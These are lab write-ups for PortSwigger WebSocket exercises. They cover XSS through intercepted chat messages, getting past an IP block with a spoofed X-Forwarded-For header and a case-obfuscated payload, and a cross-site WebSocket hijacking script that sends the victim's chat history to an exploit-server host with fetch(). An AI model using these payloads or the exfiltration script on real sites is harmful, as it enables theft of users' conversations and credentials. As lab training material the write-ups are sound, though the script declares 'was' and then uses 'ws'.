#### Reference: [Manipulating WebSocket messages to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

##### Analysis:

When you chat through websocket.
you and other person get assigned a websocketID for chatting.
You can modifie message through Burp.

##### Steps:
1. Go to live chat.

2. Send a message and capture it with Burp Intercept and send that to repeater.

3. Replace message with: `<img src=0 onerror=alert()>`

4. Send it to other person.

There you go !!!


---

#### Reference: [Manipulating the WebSocket handshake to exploit vulnerabilities](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities) 

##### Analysis:
We will perform the same step as previous lab.
But we got block when we performed xss.

Now we need to change the IP.
And then use an **obfuscated** payload.

##### Steps:

1. Go to live chat and send hi.

2. Go to burp and web socket history and send that hi message to Repeater.

3. Now use xss payload: `<img src=0 onerror=alert()>`. But you will get block.

4. You will get Connect option inside Repeater. Click on Connect.

5. add Header: `X-Forwarded-For: 1.1.1.1` and click on connect.

6. now Send new message through Burp Repeater to check the connection.

7. Replace the message with **obfuscated** payload: `<img src=1 oNeRrOr=alert'1'>`

8. Send the Message.

There you go !!!

---
#### Reference: [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

##### Analysis: 

- Session cookie SameSite=None.
  
- /chat is vulnerable endpoint.
  
- We can see that Websocket replies with entire chat history on **READY** message.

We need to send payload to victim so that his entire chat history will came back to us.

##### Steps: 

1. Go to live chat and send message.

2. Go to Websocket history Inside Burp.

3. Go to READY message and send that to repeater.

4. Send /chat to Repeater.

5. Make payload of CSRF for websocket.
```
<script>
var was = new WebSocket(
	"wss://0a4200d803d6dfd480ae6cb9002d004b.web-security-academy.net/chat"
); 

ws.onopen = function() { 
	ws.send("READY");
};

ws.onmessage = function(event) {
	fetch(
		"https://exploit-0a4700a903ecdf4e801d6bec01fc0074.exploit-server.net/exploit?message=" + btoa(event.data)
	);
	
};
</script>
```

6. You will get user credential inside access log.


There you go !!!

---
						`All Lab Completed !!!`

